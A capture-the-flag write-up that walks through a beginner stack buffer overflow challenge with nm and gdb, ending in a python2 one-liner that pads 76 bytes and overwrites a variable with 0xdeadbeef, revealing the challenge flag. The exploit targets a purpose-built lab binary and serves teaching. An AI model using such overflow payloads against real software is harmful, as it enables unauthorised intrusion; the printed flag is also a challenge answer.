# Alternate solution using GDB

Step one is obviously running the program. This yields us:

```
Change to 0xdeadbeef
old value: 0x00001337
Give me some input:
```

And the program halts for input. We enter "hello world":

```
Give me some input: hello world
new value: 0x00001337
Try again!
```

Based on the name of the task we can assume we are supposed to do a
buffer overflow attack. This means writing more bytes into a buffer than
it is intended to hold. We then assume that the input buffer is located
somewhere in memory *lower* than the value `0x1337`, and that through
overflowing the buffer the value can be changed to `0xdeadbeef` to
get the flag.

But how do we know exactly how much to overflow? This is the main
part of the challenge. When we know how far beyond the end of the buffer
we have to write `0xdeadbeef`, we are a short pipe-manouver away from
achieveing our goal.

Before we start gdb we should do some basic information gathering about
the executable:

```
nm overflowme
```

This lists all *symbols* in the symbol table of the executable (if any).
Sometimes executables are stripped of symbols to make them smaller in
size, or harder to understand/pwn.

The output is a list of rows like these:

```
0000000000600ac8 B __bss_start
0000000000600ad8 b completed.6938
0000000000600ab8 D __data_start
[...]
0000000000400650 T __libc_csu_init
                 U __libc_start_main@@GLIBC_2.2.5
00000000004005b6 T main
                 U printf@@GLIBC_2.2.5
                 U puts@@GLIBC_2.2.5
0000000000400530 t register_tm_clones
00000000004004c0 T _start
0000000000600ad0 B stdin@@GLIBC_2.2.5
0000000000600ac8 D __TMC_END__
```

These rows start with a memory address, and then a symbol name. We can
see that the symbol `main` exists (as we could suspect). This is most
likely where the program begins execution. We could gather more
information if we wanted, we could for instance use `objdump`, `hexdump`,
`xdd`, a disassembling tool, or any of a million tools out there to help
us. We chose `gdb`.

```
$ gdb overflowme
[...]
Reading symbols from overflowme...(no debugging symbols found)...done.
(gdb)
```

This is the gdb interactive shell. Read up on it! Lets use what we
learned about the symbols in the file:

```
(gdb) break main
Breakpoint 1 at 0x4005ba
(gdb) start
Temporary breakpoint 2 at 0x4005ba
Starting program: [...]/overflowme

Breakpoint 1, 0x00000000004005ba in main ()
(gdb)
```

Now we set a breakpoint at `main`, and start exeuction. As expected
the program breaks at `main` and we can continue to interact with gdb.

```
(gdb) disas main
Dump of assembler code for function main:
   0x00000000004005b6 <+0>:	push   %rbp
   0x00000000004005b7 <+1>:	mov    %rsp,%rbp
=> 0x00000000004005ba <+4>:	sub    $0x50,%rsp
   0x00000000004005be <+8>:	movl   $0x1337,-0x4(%rbp)
   0x00000000004005c5 <+15>:	mov    $0x4006d4,%edi
   0x00000000004005ca <+20>:	callq  0x400470 <puts@plt>
[...]
```
Note the arrow in the left-most column indicating where we are executing
(where we have breaked at).

This part requires you to have basic knowledge about the x86 assembly
language and basics about Intel CPU architecture. The first two lines
are standard and indicates that we initiate a new stack frame. We can
note that `%rsp` and `%rbp` indicate that the file is a 64-bit
executable, which is something we could also have found out when we
gathered information about the program before we started gdb (in 32-bit
the stack would be referenced using `%esp` and `%ebp`). The next two
lines are the key to our program. The first one moves the stackpointer
`0x50`, and the next one moves the value `0x1337` (which we recognise
as the value we are supposed to overwrite) to a 4-byte offset from the
base pointer `%rpb`.

When the stack pointer is moved a long way like it was here, `0x50`
(80) bytes, it's a strong indication that an array is stack allocated.
My initial thought here is that this is the buffer we are supposed to
overflow, which is also supported by the fact that the value `0x1337`
is situated directly next to it in memory. From this, I decided to try
and input data and see what happened.

We know that `0x1337` is to be moved to `-4(%rbp)`. We are currently
on hold two instructions before this, so we have to step two
instructions forwards. We check the location in memory before and
after, to see the effect of the move:

```
(gdb) x $rbp-4
0x7fffffffe1cc:	0x00000000
(gdb) stepi
0x00000000004005be in main ()
(gdb) stepi
0x00000000004005c5 in main ()
(gdb) x $rbp-4
0x7fffffffe1cc:	0x00001337
```

We find the value `0x1337` as we expect. The `x` command to gdb is
short for `examine`. We can look at the array that was allocated
also:

```
(gdb) x/20 $rbp-80
0x7fffffffe180:	0x00ff0000	0x00000000	0xff000000	0xff000000
0x7fffffffe190:	0x00000001	0x00000000	0x0040069d	0x00000000
0x7fffffffe1a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe1b0:	0x00400650	0x00000000	0x004004c0	0x00000000
0x7fffffffe1c0:	0xffffe2b0	0x00007fff	0x00000000	0x00001337
```

With `x/20` we print 20 *words* of the memory. A word is 4 bytes.
We see that there is some garbage here (!) and also the `0x1337`
value in the end. We use `-80` as this is the same as `-0x50`.

Now to continue with the hypothesis we need to actually input
data into the program and see if it really is stored in the allocated
space. We need to continue execution of the program for it to take
our input, but we also need to break again to be able to view the
stack state. To find a break point we again look at the main function:

```
(gdb) disas main
[...]
   0x00000000004005ed <+55>:	callq  0x400480 <printf@plt>
   0x00000000004005f2 <+60>:	mov    0x2004d7(%rip),%rdx        # 0x600ad0 <stdin@@GLIBC_2.2.5>
   0x00000000004005f9 <+67>:	lea    -0x50(%rbp),%rax
[...]
   0x0000000000400619 <+99>:	callq  0x400480 <printf@plt>
   0x000000000040061e <+104>:	cmpl   $0xdeadbeef,-0x4(%rbp)
   0x0000000000400625 <+111>:	jne    0x40063d <main+135>
[...]
```

We can see the interesting line where the library function `stdin`
is referenced. This is because of the symbols in the executable,
in the same manner that we could find `main`. We also see the line
later where `-0x4(%rbp)` is compared to `0xdeadbeef`, which is
where the program checks if we managed to overflow the buffer and
overwrite the `0x1337` value that we know is there from the start.

We can set up a break point before this instruction:

```
(gdb) break *0x40061e
Breakpoint 3 at 0x40061e
(gdb) c
Continuing.
Give me some input:
```

This time we specify an address to `break` instead of a symbol
(like we did in the start with `main`). We have to add an
asterix at the start for gdb to be happy.

`c` continues the program execution ("unbreaks"). We see that the
program prompts us for input, as expected. We can give the program
some input that we can find later in memory, the standard way
in the pwning community is filling space with the char `'A'`.

```
Give me some input: AAAA
new value: 0x00001337

Breakpoint 5, 0x000000000040061e in main ()
(gdb)
```

The program broke (*wink wink*) again, and we can examine the
stack to see if our A's are present. this time remember that
the stack pointers have moved so we need to use the memory
addresses form the last time we viewed the stack to get the same
view.

```
(gdb) x/20 0x7fffffffe180
0x7fffffffe180:	0x41414141	0x0000000a	0xff000000	0xff000000
0x7fffffffe190:	0x00000001	0x00000000	0x0040069d	0x00000000
0x7fffffffe1a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe1b0:	0x00400650	0x00000000	0x004004c0	0x00000000
0x7fffffffe1c0:	0xffffe2b0	0x00007fff	0x00000000	0x00001337
```

We see the 4 `'A'`'s we input as `0x41414141`.

Thats great! Our hypothesis is correct, the input is stored in
the stack allocated buffer. We can now use Python and the
aforementioned pipe-manouver to get the flag.

The distance from `0x1337` to the first of our 4 A's is easily
deduced from the stack pointer values: `80 - 4 = 76`

```
$ python2 -c 'print "A"*76 + "\xef\xbe\xad\xde"' | ./overflowme
Change to 0xdeadbeef
old value: 0x00001337
Give me some input: new value: 0xdeadbeef
Yay! The token is: TG17{0verfl0ws are c00l}
```
Note that we input "deadbeef" in reverse order in pairs of
letters. This has to do with endianness, and that each byte
is representable by two hex symbols. Read up on it!

We could have done this last step at once we identified the
distance as 76, but hopefully we learned something useful when
disasembling and stepping through the progam and viewing the
stack as we went along :)

